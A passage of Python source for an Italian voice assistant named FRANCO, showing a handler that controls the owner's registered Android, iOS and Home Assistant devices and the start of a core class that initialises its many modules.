        "wake":       ("sveglia", "risveglia", "sblocca", "accendi schermo"),
        "ring":       ("fai squillare", "squilla", "trova", "localizza", "suona"),
        "screenshot": ("fai uno screenshot", "screenshot", "schermata", "cattura schermo"),
        "reboot":     ("riavvia", "reboot"),
        "lock":       ("blocca", "chiudi a chiave"),
        "toggle":     ("commuta", "inverti", "cambia stato"),
        "on":         ("accendi", "attiva", "avvia"),
        "off":        ("spegni", "disattiva", "ferma"),
    }

    _TRIGGER_WORDS = (
        "dispositiv", "telefono", "cellulare", "smartphone", "tablet",
        "iphone", "ipad", "luce", "luci", "presa", "prese", "termostato",
        "clima", "temperatura", "scena", "casa", "smart home", "home assistant",
    )
    _MGMT_WORDS = (
        "lista dispositivi", "mostra dispositivi", "quali dispositivi",
        "aggiungi dispositivo", "autorizza dispositivo", "rimuovi dispositivo",
        "elimina dispositivo", "revoca dispositivo", "comandi dispositivi", "comandi vocali dispositivi",
    )

    def __init__(self, logger, db, config, event_bus=None, ha_provider=None):
        self.logger = logger
        self.db = db
        self.config = config
        self.event_bus = event_bus
        self._ha_provider = ha_provider or (lambda: None)

    # ---- infrastruttura ------------------------------------------------ #
    def _ha(self):
        try:
            return self._ha_provider()
        except Exception:
            return None

    def _log(self, msg, level="info"):
        try:
            getattr(self.logger, level, self.logger.info)("DEVICE", msg)
        except Exception:
            pass

    def _owner_name(self) -> str:
        try:
            return self.config.get("user.name", "") or "Utente"
        except Exception:
            return "Utente"

    def _all_devices(self) -> List[Dict]:
        try:
            return self.db.get_all_devices() or []
        except Exception:
            return []

    # ---- guardia di routing -------------------------------------------- #
    def should_handle(self, text: str) -> bool:
        t = text.lower()
        if any(m in t for m in self._MGMT_WORDS):
            return True
        for d in self._all_devices():
            nm = (d.get("device_name") or "").lower()
            if nm and nm in t:
                return True
        has_action = any(any(p in t for p in phrases) for phrases in self._ACTIONS.values())
        has_target = any(w in t for w in self._TRIGGER_WORDS)
        broadcast  = any(w in t for w in ("tutti", "tutto", "ogni dispositivo"))
        # query/impostazione smart-home senza verbo d'azione classico
        smart_query = (any(w in t for w in ("luce", "luci", "presa", "prese", "termostato",
                                            "clima", "temperatura", "scena", "casa"))
                       and any(w in t for w in ("stato", "imposta", "metti", "porta", "grad")))
        return (has_action and (has_target or broadcast)) or smart_query

    # ---- entrypoint ----------------------------------------------------- #
    def handle(self, text: str) -> str:
        t = text.lower().strip()
        try:
            if any(m in t for m in ("comandi dispositivi", "comandi vocali dispositivi")):
                return render_voice_command_catalog(color=False)
            if t.startswith("aggiungi dispositivo"):
                return self._do_add(text)
            if t.startswith("revoca dispositivo"):
                name = text[len("revoca dispositivo"):].strip()
                if not any(d["device_name"] == name for d in self._all_devices()):
                    return "Dispositivo non trovato."
                ok = self.db.set_device_authorized(name, False)
                return f"Accesso revocato: {name}." if ok else "Revoca non riuscita."
            if t.startswith("autorizza dispositivo"):
                return self._do_authorize(text)
            if t.startswith(("rimuovi dispositivo", "elimina dispositivo")):
                return self._do_remove(text)
            if any(m in t for m in ("lista dispositivi", "mostra dispositivi", "quali dispositivi")):
                return self._do_list()
            return self._do_action(text)
        except Exception as e:
            self._log(f"handle error: {e}", "error")
            return "Non sono riuscito a completare il comando sul dispositivo."

    # ---- azioni --------------------------------------------------------- #
    def _resolve_action(self, t: str) -> Optional[str]:
        best = None  # (canon, match_len)
        for canon, phrases in self._ACTIONS.items():
            for p in phrases:
                if p in t and (best is None or len(p) > best[1]):
                    best = (canon, len(p))
        return best[0] if best else None

    def _do_action(self, text: str) -> str:
        t = text.lower()
        action = self._resolve_action(t)

        # Smart home ha priorità se il target è una luce/presa/clima/scena/casa,
        # anche senza un verbo d'azione classico (es. "stato della casa",
        # "imposta la temperatura a 21 gradi").
        if any(w in t for w in ("luce", "luci", "presa", "prese", "termostato",
                                "temperatura", "clima", "scena", "casa")):
            return self._ha_action(t, action)

        if not action:
            return "Che azione devo eseguire sul dispositivo?"

        broadcast = any(w in t for w in ("tutti i dispositivi", "tutti", "tutto",
                                         "ogni dispositivo"))
        targets = self._all_devices() if broadcast else self._match_devices(t)
        targets = [d for d in targets if d.get("authorized")]
        if not targets:
            if broadcast:
                return "Nessun dispositivo autorizzato registrato."
            return ("Non ho trovato quel dispositivo. Di' 'lista dispositivi' "
                    "per vedere quelli registrati.")

        results = []
        for d in targets:
            ok, info = self._mobile_action(d, action, text)
            try:
                if ok and d.get("platform") != "ios":
                    self.db.touch_device_seen(d["device_name"])
            except Exception:
                pass
            results.append((d["device_name"], ok, info))
            if self.event_bus:
                try:
                    self.event_bus.emit("device.command",
                                        device=d["device_name"], action=action, ok=ok)
                except Exception:
                    pass

        return "\n".join(f"{name}: {info if info else ('comando completato' if ok else 'comando fallito')}"
                         for name, ok, info in results)

    def _match_devices(self, t: str) -> List[Dict]:
        out = []
        for d in self._all_devices():
            nm = (d.get("device_name") or "").lower()
            owner = (d.get("owner_name") or "").lower()
            if nm and nm in t:
                out.append(d)
            elif owner and ("di " + owner) in t:
                out.append(d)
        if out:
            return out
        if "iphone" in t or "ipad" in t or "ios" in t:
            matches = [d for d in self._all_devices() if d.get("platform") == "ios"]
            return matches if len(matches) == 1 else []
        if any(w in t for w in ("telefono", "cellulare", "smartphone", "tablet", "android")):
            andro = [d for d in self._all_devices() if d.get("platform") == "android"]
            return andro if len(andro) == 1 else []
        return []

    def _mobile_action(self, device: Dict, action: str, raw_text: str):
        platform = (device.get("platform") or "").lower()
        if platform == "android":
            return self._android_action(device, action, raw_text)
        if platform == "ios":
            return self._ios_action(device, action, raw_text)
        return False, "piattaforma sconosciuta"

    # ---- Android (ADB over TCP) ---------------------------------------- #
    def _adb(self, address: str, args: List[str], timeout: int = 15):
        base = ["adb"] + (["-s", address] if address else [])
        try:
            rc, out, err = run_command(base + args, timeout=timeout)
            return rc == 0, (out or err or "").strip()
        except Exception as e:
            return False, str(e)

    def _android_action(self, device: Dict, action: str, raw_text: str):
        addr = device.get("address") or ""
        if addr:
            # connessione idempotente: se già connesso non fa nulla
            try:
                run_command(["adb", "connect", addr], timeout=8)
            except Exception:
                pass
        keyevents = {
            "lock":     ["shell", "input", "keyevent", "223"],   # SLEEP
            "off":      ["shell", "input", "keyevent", "223"],
            "wake":     ["shell", "input", "keyevent", "224"],   # WAKEUP
            "on":       ["shell", "input", "keyevent", "224"],
            "vol_up":   ["shell", "input", "keyevent", "24"],
            "vol_down": ["shell", "input", "keyevent", "25"],
        }
        if action in keyevents:
            return self._adb(addr, keyevents[action])
        if action == "reboot":
            return self._adb(addr, ["reboot"], timeout=20)
        if action == "ring":
            # "trova il telefono": massimizza la suoneria e posta una notifica sonora
            self._adb(addr, ["shell", "media", "volume", "--stream", "3", "--set", "25"])
            return self._adb(addr, ["shell", "cmd", "notification", "post",
                                    "-S", "bigtext", "-t", "FRANCO",
                                    "franco_find", "Sto cercando questo telefono!"])
        if action == "screenshot":
            path = f"/sdcard/franco_shot_{int(time.time())}.png"
            ok, _ = self._adb(addr, ["shell", "screencap", "-p", path])
            return ok, path
        return False, "azione non supportata su Android"

    # ---- iOS (push ntfy → Scorciatoia) --------------------------------- #
    def _ios_topic(self, device: Dict) -> str:
        addr = (device.get("address") or "").strip()
        if addr:
            return addr
        try:
            cfgtopic = self.config.get("mobile.ios_topic", "") or ""
        except Exception:
            cfgtopic = ""
        return cfgtopic or f"FRANCO_{(device.get('device_name') or 'ios').replace(' ', '_')}"

    def _ios_shortcut_for(self, device: Dict, action: str, raw_text: str) -> str:
        try:
            mapping = json.loads(device.get("ios_shortcut_actions") or "{}")
        except Exception:
            mapping = {}
        if action in mapping:
            return mapping[action]
        m = re.search(r"scorciatoia\s+(.+?)(?:\s+sull|\s+sul|\s+su|$)", raw_text.lower())
        if m:
            return m.group(1).strip()
        return {"lock": "Blocca", "off": "Blocca", "ring": "Trova",
                "wake": "Sveglia", "reboot": "Riavvia"}.get(action, action)

    def _ios_action(self, device: Dict, action: str, raw_text: str):
        from urllib.parse import urlencode
        if requests is None:
            return False, "Installa requests per inviare notifiche iPhone/iPad."
        if action in ("wake", "toggle"):
            return False, "Questa azione non e disponibile tramite il bridge iOS."
        shortcut = self._ios_shortcut_for(device, action, raw_text)
        topic = self._ios_topic(device)
        if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", topic):
            return False, "Topic ntfy non valido."
        url = "shortcuts://run-shortcut?" + urlencode({"name": shortcut})
        try:
            response = requests.post(
                "https://ntfy.sh",
                json={"topic": topic, "title": "FRANCO",
                      "message": f"Esegui {shortcut} sul dispositivo. Tocca Apri scorciatoia.",
                      "actions": [{"action": "view", "label": "Apri scorciatoia", "url": url}]},
                timeout=6,
            )
            response.raise_for_status()
            return True, f"Richiesta inviata: {shortcut}. Apri la notifica sul dispositivo; esecuzione non confermata."
        except Exception:
            return False, "Invio ntfy fallito: verifica connessione e configurazione."

    # ---- Home Assistant ------------------------------------------------- #
    @staticmethod
    def _extract_name(t: str, kw: str) -> str:
        m = re.search(kw + r"\s+(?:del|della|dello|dei|degli|delle|di|in|the)?\s*"
                           r"([a-zàèéìòù0-9 ]+)", t)
        if not m:
            return ""
        name = m.group(1).strip()
        for stop in (" e ", " poi ", " grazie", " a "):
            if stop in name:
                name = name.split(stop)[0]
        return name.strip()

    def _ha_resolve_entities(self, ha, t: str, domain: str) -> List[str]:
        states = ha.get_all_states() or []
        ents = [s for s in states if s.get("entity_id", "").startswith(domain + ".")]
        if any(w in t for w in ("tutte", "tutti", "ogni")):
            return [s["entity_id"] for s in ents]
        name = (self._extract_name(t, "luci") or self._extract_name(t, "luce")
                or self._extract_name(t, "presa"))
        toks = [w for w in re.split(r"\W+", name) if len(w) > 2]
        if not toks:
            return [s["entity_id"] for s in ents]
        matched = []
        for s in ents:
            hay = ((s.get("attributes", {}) or {}).get("friendly_name", "")
                   + " " + s["entity_id"]).lower()
            if any(tok in hay for tok in toks):
                matched.append(s["entity_id"])
        return matched or [s["entity_id"] for s in ents]

    def _ha_action(self, t: str, action: Optional[str]) -> str:
        ha = self._ha()
        if ha is None or not getattr(ha, "is_available", lambda: False)():
            return "Home Assistant non è configurato. Imposta HA_URL e HA_TOKEN."
        # Riepilogo stato casa (query, nessuna azione su luci/prese)
        if "stato" in t or ("casa" in t and action not in ("on", "off", "toggle")
                            and not any(k in t for k in ("luce", "luci", "presa", "prese"))):
            return ha.summary()
        # Termostato
        m = re.search(r"(\d{1,2})\s*grad", t)
        if m and (any(w in t for w in ("temperatura", "termostato", "clima"))
                  or any(w in t for w in ("imposta", "metti", "porta"))):
            temp = float(m.group(1))
            clims = ha.get_entities_by_domain("climate")
            ok = any(ha.set_temperature(e, temp) for e in clims)
            return (f"Temperatura impostata a {int(temp)} gradi." if ok
                    else "Nessun termostato raggiungibile.")
        if "scena" in t:
            name = self._extract_name(t, "scena").replace(" ", "_")
            if name and ha.run_scene(name):
                return f"Scena {name} attivata."
            return "Non ho trovato quella scena."
        # Luci / prese: senza azione chiara → riepilogo
        if action not in ("on", "off", "toggle"):
            return ha.summary()
        domain = ("light" if ("luce" in t or "luci" in t)
                  else "switch" if ("presa" in t or "prese" in t) else "light")
        entities = self._ha_resolve_entities(ha, t, domain)
        if not entities:
            return "Non ho trovato luci o prese corrispondenti."
        okc = 0
        for e in entities:
            if action == "on" and ha.turn_on(e):
                okc += 1
            elif action == "off" and ha.turn_off(e):
                okc += 1
            elif action == "toggle" and ha.toggle(e):
                okc += 1
        label = "luci" if domain == "light" else "prese"
        verb = {"on": "acceso", "off": "spento", "toggle": "commutato"}.get(action, action)
        return (f"Ho {verb} {okc} {label}." if okc
                else "Nessun dispositivo ha risposto.")

    # ---- gestione ------------------------------------------------------- #
    def _do_list(self) -> str:
        devs = self._all_devices()
        if not devs:
            return ("Nessun dispositivo registrato. Aggiungine uno con "
                    "'aggiungi dispositivo <nome> android <ip:porta>'.")
        lines = ["Dispositivi registrati:"]
        for d in devs:
            auth = "autorizzato" if d.get("authorized") else "NON autorizzato"
            addr = f" @ {d['address']}" if d.get("address") else ""
            lines.append(f"• {d['device_name']} ({d.get('platform')}, {auth}){addr}")
        return "\n".join(lines)

    def _do_add(self, text: str) -> str:
        m = re.search(r"aggiungi dispositivo\s+(.+)", text, re.IGNORECASE)
        if not m:
            return "Formato: aggiungi dispositivo <nome> <android|ios> <ip:porta o topic>"
        match = re.fullmatch(r"(.+?)\s+(android|ios|iphone|ipad|ipados)(?:\s+(\S+))?", m.group(1).strip(), re.IGNORECASE)
        if not match:
            return "Formato: aggiungi dispositivo <nome> <android|iphone|ipad> [ip:porta o topic]"
        name, plat, address = match.groups()
        plat = "android" if plat.lower() == "android" else "ios"
        address = address or ""
        if plat == "ios":
            import secrets
            address = address or "franco_" + secrets.token_hex(16)
            if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", address):
                return "Topic ntfy non valido: usa lettere, numeri, trattini e underscore."
        elif not address or not re.fullmatch(r"[A-Za-z0-9_.-]+:[0-9]{1,5}", address) or not 1 <= int(address.rsplit(":", 1)[1]) <= 65535:
            return "Specifica l'indirizzo Android nel formato ip:porta del debug wireless."
        rid = self.db.add_device(name, self._owner_name(), plat, address, "{}")
        if rid is None:
            return f"Il dispositivo '{name}' esiste già o non è valido."
        self.db.set_device_authorized(name, True)
        addr_txt = f" all'indirizzo {address}." if address else "."
        return f"Dispositivo '{name}' ({plat}) aggiunto e autorizzato{addr_txt}"

    def _do_authorize(self, text: str) -> str:
        name = re.sub(r".*autorizza dispositivo\s+", "", text, flags=re.IGNORECASE).strip()
        if not name:
            return "Quale dispositivo devo autorizzare?"
        ok = self.db.set_device_authorized(name, True)
        return f"Dispositivo '{name}' autorizzato." if ok else "Dispositivo non trovato."

    def _do_remove(self, text: str) -> str:
        name = re.sub(r".*(?:rimuovi|elimina) dispositivo\s+", "", text, flags=re.IGNORECASE).strip()
        if not name:
            return "Quale dispositivo devo rimuovere?"
        ok = self.db.delete_device(name)
        return f"Dispositivo '{name}' rimosso." if ok else "Dispositivo non trovato."


# ==============================================================================
# FRANCO CORE — Coordinatore principale
# ==============================================================================

class FrancoCore:
    """
    Coordinatore centrale di FRANCO 6.0 NEXUS.
    Inizializza e gestisce tutti i sottosistemi.
    """

    def __init__(self):
        # Coda comandi voice → engine
        self._command_queue: queue.Queue = queue.Queue(maxsize=50)
        self._response_queue: queue.Queue = queue.Queue()

        # Inizializza moduli core (ordine dipendenze)
        self.logger = StructuredLogger(
            name="FRANCO",
            min_level=LogLevel.INFO,
            console_output=True,
            file_output=True
        )
        self.event_bus = EventBus()
        self.state = StateManager(event_bus=self.event_bus)
        self.cache = CacheManager()
        self.db = DatabaseManager()
        self.config = ConfigurationManager()
        self.memory = MemoryManager()

        # Moduli avanzati
        self.vault = CryptoVault()
        self.email_cfg = EmailConfigManager()
        self.backup_mgr = BackupManager()

        # AI & NLP
        api_key = API_KEY_CLAUDE or self.config.get("ai.api_key", "")
        self.ai = ClaudeAIClient(api_key, self.logger, self.db, self.cache, self.memory)
        self.nlp = NLPEngine()
        self.mood_detector = MoodDetector()

        # Security
        self.security = SecurityCoordinator(self.logger, self.db, self.event_bus)

        # TTS
        self.tts = VoiceSynthesizer(self.logger, self.state, self.cache)

        # Vision
        self.vision = ScreenVision(self.logger, self.ai)

        # App Launcher — discovery e avvio di QUALSIASI app installata
        # (menu Start, registro Windows, Program Files/AppData)
        self.app_launcher = AppLauncher(
            config=EXTRAS_CONFIG,
            cache_file=CACHE_DIR / "app_launcher_index.json",
            logger=self.logger,
        )
        threading.Thread(
            target=self.app_launcher.refresh, kwargs={"force": False},
            daemon=True, name="AppLauncherScan"
        ).start()

        # Command Engine
        self.engine = CommandEngine(
            logger=self.logger,
            state=self.state,
            memory=self.memory,
            db=self.db,
            cache=self.cache,
            config=self.config,
            event_bus=self.event_bus,
            ai_client=self.ai,
            voice_synth=self.tts,
            screen_vision=self.vision,
            security=self.security,
            nlp=self.nlp,
            backup_mgr=self.backup_mgr,
            vault=self.vault,
            email_cfg=self.email_cfg,
            app_launcher=self.app_launcher
        )
        try:
            from .memory_guard import MemoryGuard
            self.memory_guard = MemoryGuard(
                DATA_DIR, logger=self.logger, state=self.state,
                event_bus=self.event_bus, cache=self.cache, tts=self.tts)
            self.engine.memory_guard = self.memory_guard
            self.logger.success("CORE", "Memory Guard attivo: conferma obbligatoria per processi esterni")
        except Exception as error:
            self.memory_guard = None
            self.logger.warning("CORE", f"Memory Guard non disponibile: {error}")
 
        # === LOCAL AI (LLM offline, Llama-3.1-8B/Mistral GGUF) ===
        # Prima del router: se c'e' un modello locale, diventa il cervello
        # predefinito di FRANCO (nessuna quota, offline, ma piu' lento e
        # meno capace dei modelli cloud — accettato dall'utente).
        try:
            from franco_local_ai import get_local_ai
            self.local_ai = get_local_ai(logger=self.logger)
            self.engine.local_ai = self.local_ai
            if self.local_ai.model_name != "rule-based-fallback":
                self.logger.success("CORE",
                    f"Local AI trovato: {self.local_ai.model_name} (caricamento su richiesta)")
            else:
                self.logger.info("CORE",
                    "Local AI fallback rule-based (nessun modello GGUF)")
        except Exception as e:
            self.local_ai = None
            self.logger.warning("CORE", f"Local AI non caricato: {e}")
        # === FINE LOCAL AI ===

        # === OMNI AI (multi-modello, 1 chiave OpenRouter) + DUAL ROUTER ===
        try:
            from franco_patch_dual_ai import (
                DualAIRouter, RealFileSaver, patch_command_engine
            )
            from franco_omni_ai import OmniAI
            from franco_code_agent import patch_code_agent

            # Cervello multi-modello: sceglie da solo il modello migliore per compito.
            # Chiave SOLO da variabile ambiente OPENROUTER_API_KEY (mai hardcodata).
            self.omni = OmniAI(
                api_key=os.environ.get("OPENROUTER_API_KEY", ""),
                logger=self.logger,
            )
            self.mistral = self.omni   # alias di compatibilità col resto del codice

            # Cloud (OpenRouter, modelli enormi e gratuiti) resta il
            # cervello predefinito: molto piu' capace di un 7-8B locale.
            # Il modello locale (Llama-3.1-8B) e' collegato come rete di
            # sicurezza AUTOMATICA — il router ci passa da solo se il cloud
            # non risponde (nessuna connessione) o se la quota gratuita
            # giornaliera si esaurisce (vedi _looks_like_failure in
            # franco_patch_dual_ai.py), senza bisogno di comandi manuali.
            has_local = bool(self.local_ai and self.local_ai.model_name != "rule-based-fallback")
            default_brain = "claude" if self.ai.is_available() else "openrouter"
            self.router = DualAIRouter(
                claude_client=self.ai,
                openrouter_client=self.omni,
                local_client=self.local_ai if has_local else None,
                logger=self.logger,
                default_ai=default_brain,
            )
            # Instrada ogni tipo di task al provider giusto: codice e
            # ragionamento restano su OpenRouter (il locale non e' abbastanza
            # capace per questi), la chat generica usa il default (locale).
            self.router.set_preference("code",      "openrouter")
            self.router.set_preference("reasoning", "openrouter")

            self.saver = RealFileSaver(logger=self.logger, prefer_desktop=False)
            patch_command_engine(self.engine, self.router, self.saver)
            self.code_agent = patch_code_agent(self.engine, self.router, self.logger)
            n_models = sum(len(v) for v in self.omni.list_models().values())
            brain_label = {"local": "Llama locale", "openrouter": "OpenRouter multi",
                           "claude": "Claude+OR"}.get(default_brain, default_brain)
            self.state.set("ai_brain", f"{brain_label} · {n_models} AI")
            self.logger.success("CORE",
                f"OmniAI attivo (cervello: {default_brain}, {n_models} modelli)")
        except ImportError as e:
            self.logger.warning("CORE", f"Patch AI non trovata ({e}) — funziona senza")
        # === FINE PATCH ===

        try:
            from .model_router import LatencyRouter, environment_providers
            providers = environment_providers()
            def _default_provider(prompt, system=None, max_tokens=450, temperature=.65, **kwargs):
                target = getattr(self, "router", None)
                if target and getattr(target, "is_available", lambda: False)():
                    return target.chat(prompt, system=system, max_tokens=max_tokens,
                                       temperature=temperature,
                                       task_type=kwargs.get("task_type", "conversational"))
                return self.ai.chat(prompt, system=system, max_tokens=max_tokens,
                                    temperature=temperature)
            providers["default"] = _default_provider
            local = getattr(self, "local_ai", None)
            if local and getattr(local, "chat", None):
                providers["local"] = lambda prompt, **kw: local.chat(prompt)
            self.latency_router = LatencyRouter(providers, logger=self.logger)
            self.engine.latency_router = self.latency_router
            self.logger.success("CORE", "Router latenza fast/standard/complex attivo")
        except Exception as error:
            self.latency_router = None
            self.logger.warning("CORE", f"Router latenza non disponibile: {error}")

        # === SECOND BRAIN (memoria totale + ricerca semantica offline) ===
        try:
            from franco_second_brain import SecondBrain, patch_second_brain
            self.brain = SecondBrain(ai=getattr(self, "omni", None), logger=self.logger)
            patch_second_brain(self.engine, self.brain, self.logger)
            st = self.brain.stats()
            self.state.set("brain_chunks", st["frammenti"])
            self.logger.success("CORE",
                f"Second Brain attivo ({st['frammenti']} frammenti in memoria)")
        except Exception as e:
            self.brain = None
            self.logger.warning("CORE", f"Second Brain non caricato: {e}")
        # === FINE SECOND BRAIN ===

        # === KNOWLEDGE BASE (Wikipedia + documenti) ===
        try:
            from franco_knowledge import get_knowledge
            self.knowledge = get_knowledge(logger=self.logger)
            self.engine.knowledge = self.knowledge
            _kb_st = self.knowledge.stats()
            self.logger.success("CORE",
                f"Knowledge Base: {_kb_st['documenti']} doc, {_kb_st['chunk']} chunk")
        except Exception as e:
            self.knowledge = None
            self.logger.warning("CORE", f"Knowledge Base non caricata: {e}")
        # === FINE KNOWLEDGE BASE ===

        # === DOWNLOAD MANAGER (asset pesanti in background) ===
        try:
            from franco_downloader import FrancoDownloadManager
            self.downloader = FrancoDownloadManager(logger=self.logger)
            # Downloads run only when requested, never as an implicit boot task.
            self.engine.downloader = self.downloader
            self.logger.info("CORE", "Download manager pronto su richiesta")
        except Exception as e:
            self.downloader = None
            self.logger.warning("CORE", f"Download manager non caricato: {e}")
        # === FINE DOWNLOAD MANAGER ===

        # === MONITOR SISTEMA AVANZATO ===
        try:
            from franco_monitor import get_monitor, write_structured_log

            def _on_alert(level: str, metric: str, value: float, threshold: float):
                msg = f"[ALERT {level}] {metric.upper()} = {value:.1f}% (soglia {threshold:.0f}%)"
                self.logger.warning("MONITOR", msg)
                try: self.event_bus.emit("system.alert",
                                         data={"level": level, "metric": metric,
                                               "value": value, "threshold": threshold})
                except Exception:
                    pass

            self.system_monitor = get_monitor(
                logger=self.logger,
                interval=10.0,
                on_alert=_on_alert
            )
            self.system_monitor.start()
            self.engine.system_monitor = self.system_monitor
            self.logger.success("CORE", "System Monitor attivo (intervallo 10s)")
        except Exception as e:
            self.system_monitor = None
            self.logger.warning("CORE", f"System Monitor non caricato: {e}")
        # === FINE MONITOR ===

        # === SKILL MANAGER (automazioni personalizzabili) ===
        try:
            from franco_skills import get_skill_manager
            self.skills = get_skill_manager(franco_engine=self, logger=self.logger)
            self.engine.skills = self.skills
            st = self.skills.stats()
            self.logger.success("CORE",
                f"Skill Manager: {st['abilitate']} skill attive")
        except Exception as e:
            self.skills = None
            self.logger.warning("CORE", f"Skill Manager non caricato: {e}")
        # === FINE SKILL MANAGER ===

        # === NLP (analisi intent/sentiment offline) ===
        try:
            from franco_nlp import get_nlp
            self.nlp = get_nlp(logger=self.logger)
            self.engine.nlp = self.nlp
            self.logger.success("CORE", "NLP italiano attivo (sentiment + intent + entità)")
        except Exception as e:
            self.nlp = None
            self.logger.warning("CORE", f"NLP non caricato: {e}")
        # === FINE NLP ===

        # === EPISODIC MEMORY (timeline, journal, export) ===
        try:
            from franco_memory_extended import get_episodic_memory
            self.episodic = get_episodic_memory(logger=self.logger)
            self.engine.episodic = self.episodic
            st = self.episodic.stats()
            self.logger.success("CORE",
                f"Episodic Memory: {st['totale_episodi']} episodi, {st['sessioni']} sessioni")
        except Exception as e:
            self.episodic = None
            self.logger.warning("CORE", f"Episodic Memory non caricata: {e}")
        # === FINE EPISODIC MEMORY ===

        # === SECURITY EXTENDED (audit processi, rete, integrità file) ===
        try:
            from franco_security_extended import get_fim, audit_network
            self.fim     = get_fim()
            self.engine.fim = self.fim
            self.logger.success("CORE", "Security Extended (FIM + audit) attivo")
        except Exception as e:
            self.fim = None
            self.logger.warning("CORE", f"Security Extended non caricato: {e}")
        # === FINE SECURITY EXTENDED ===

        # === TASK MANAGER (to-do avanzato con scadenze e priorità) ===
        try:
            from franco_tasks import get_task_manager
            self.tasks = get_task_manager(logger=self.logger)
            self.engine.tasks = self.tasks
            st = self.tasks.stats()
            self.logger.success("CORE",
                f"Task Manager: {st['attivi']} task attivi, {st['scaduti']} scaduti")
        except Exception as e:
            self.tasks = None
            self.logger.warning("CORE", f"Task Manager non caricato: {e}")
        # === FINE TASK MANAGER ===

        # === PROJECT MANAGER (milestone, sprint, burndown) ===
        try:
            from franco_projects import get_project_manager
            self.projects = get_project_manager(logger=self.logger)
            self.engine.projects = self.projects
            st = self.projects.stats()
            self.logger.success("CORE",
                f"Project Manager: {st['progetti_attivi']} progetti, {st['task_aperti']} task")
        except Exception as e:
            self.projects = None
            self.logger.warning("CORE", f"Project Manager non caricato: {e}")
        # === FINE PROJECT MANAGER ===

        # === RECIPES (cucina italiana + lista spesa) ===
        try:
            from franco_recipes import get_recipes
            self.recipes = get_recipes(logger=self.logger)
            self.engine.recipes = self.recipes
            st = self.recipes.stats()
            self.logger.success("CORE", f"Recipes: {st['ricette']} ricette disponibili")
        except Exception as e:
            self.recipes = None
            self.logger.warning("CORE", f"Recipes non caricato: {e}")
        # === FINE RECIPES ===

        # === NEWS ===
        try:
            from franco_news import get_news
            self.news = get_news(logger=self.logger)
            st = self.news.stats()
            self.logger.success("CORE", f"News: {st['totale']} articoli, {st['non_letti']} non letti")
            self.engine.news = self.news
        except Exception as e:
            self.news = None
            self.logger.warning("CORE", f"News non caricato: {e}")
        # === FINE NEWS ===

        # === CALENDAR ===
        try:
            from franco_calendar import get_calendar
            self.calendar = get_calendar(logger=self.logger)
            st = self.calendar.stats()
            self.logger.success("CORE", f"Calendario: {st['totale']} eventi, {st['oggi']} oggi")
            self.engine.calendar = self.calendar
        except Exception as e:
            self.calendar = None
            self.logger.warning("CORE", f"Calendario non caricato: {e}")
        # === FINE CALENDAR ===

        # === FINANCE ===
        try:
            from franco_finance import get_finance
            self.finance = get_finance(logger=self.logger)
            st = self.finance.stats()
            self.logger.success("CORE", f"Finance: {st['transazioni_totali']} transazioni registrate")
            self.engine.finance = self.finance
        except Exception as e:
            self.finance = None
            self.logger.warning("CORE", f"Finance non caricato: {e}")
        # === FINE FINANCE ===

        # === HEALTH ===
        try:
            from franco_health import get_health
            self.health = get_health(logger=self.logger)
            st = self.health.stats()
            self.logger.success("CORE", f"Health: tracker attivo (farmaci: {st['farmaci_att']})")
            self.engine.health = self.health
        except Exception as e:
            self.health = None
            self.logger.warning("CORE", f"Health non caricato: {e}")
        # === FINE HEALTH ===

        # === WEATHER ===
        try:
            from franco_weather import get_weather as _get_weath
            self.weather_mod = _get_weath(logger=self.logger)
            st = self.weather_mod.stats()
            self.logger.success("CORE", f"Meteo: pronto (default: {st['citta_default']})")
            self.engine.weather_mod = self.weather_mod
        except Exception as e:
            self.weather_mod = None
            self.logger.warning("CORE", f"Meteo non caricato: {e}")
        # === FINE WEATHER ===

        # === BOOKMARKS ===
        try:
            from franco_bookmarks import get_bookmarks
            self.bookmarks = get_bookmarks(logger=self.logger)
            st = self.bookmarks.stats()
            self.logger.success("CORE", f"Bookmarks: {st['totale']} segnalibri ({st['pinnati']} pinnati)")
            self.engine.bookmarks = self.bookmarks
        except Exception as e:
            self.bookmarks = None
            self.logger.warning("CORE", f"Bookmarks non caricato: {e}")
        # === FINE BOOKMARKS ===

        # === QUOTES ===
        try:
            from franco_quotes import get_quotes
            self.quotes = get_quotes(logger=self.logger)
            st = self.quotes.stats()
            self.logger.success("CORE", f"Quotes: {st['totale']} citazioni disponibili")
            self.engine.quotes = self.quotes
        except Exception as e:
            self.quotes = None
            self.logger.warning("CORE", f"Quotes non caricato: {e}")
        # === FINE QUOTES ===

        # === NOTES ===
        try:
            from franco_notes import get_notes
            self.notes_mod = get_notes(logger=self.logger)
            st = self.notes_mod.stats()
            self.logger.success("CORE", f"Notes: {st['totale']} note ({st['notebook']} notebook)")
            self.engine.notes_mod = self.notes_mod
        except Exception as e:
            self.notes_mod = None
            self.logger.warning("CORE", f"Notes non caricato: {e}")
        # === FINE NOTES ===

        # === POMODORO ===
        try:
            from franco_pomodoro import get_pomodoro
            self.pomodoro = get_pomodoro(logger=self.logger)
            st = self.pomodoro.today_stats()
            self.logger.success("CORE", f"Pomodoro: {st['pomodori']} sessioni oggi, streak {self.pomodoro.streak()}gg")
            self.engine.pomodoro = self.pomodoro
        except Exception as e:
            self.pomodoro = None
            self.logger.warning("CORE", f"Pomodoro non caricato: {e}")
        # === FINE POMODORO ===

        # === CONTACTS ===
        try:
            from franco_contacts import get_contacts
            self.contacts = get_contacts(logger=self.logger)
            st = self.contacts.stats()
            self.logger.success("CORE", f"Contacts: {st['totale']} contatti ({st['preferiti']} preferiti)")
            self.engine.contacts = self.contacts
        except Exception as e:
            self.contacts = None
            self.logger.warning("CORE", f"Contacts non caricato: {e}")
        # === FINE CONTACTS ===

        # === WEB AGENCY (prospecting siti web per locali) ===
        try:
            from franco_web_agency import get_web_agency
            self.web_agency = get_web_agency(omni_ai=getattr(self, "omni", None), logger=self.logger)
            self.engine.web_agency = self.web_agency
            self.logger.success("CORE", "Web Agency: modulo prospecting attivo")
        except Exception as e:
            self.web_agency = None
            self.logger.warning("CORE", f"Web Agency non caricato: {e}")
        # === FINE WEB AGENCY ===

        # === OUTREACH DRAFTS (bozze messaggi — MAI invio automatico) ===
        try:
            from franco_outreach_drafts import get_outreach_drafts
            self.outreach = get_outreach_drafts(logger=self.logger)
            self.engine.outreach = self.outreach
            self.logger.success("CORE", "Outreach: coda bozze attiva (invio sempre manuale)")
        except Exception as e:
            self.outreach = None
            self.logger.warning("CORE", f"Outreach non caricato: {e}")
        # === FINE OUTREACH DRAFTS ===

        # Voice Recognizer
        self.voice = VoiceRecognizer(
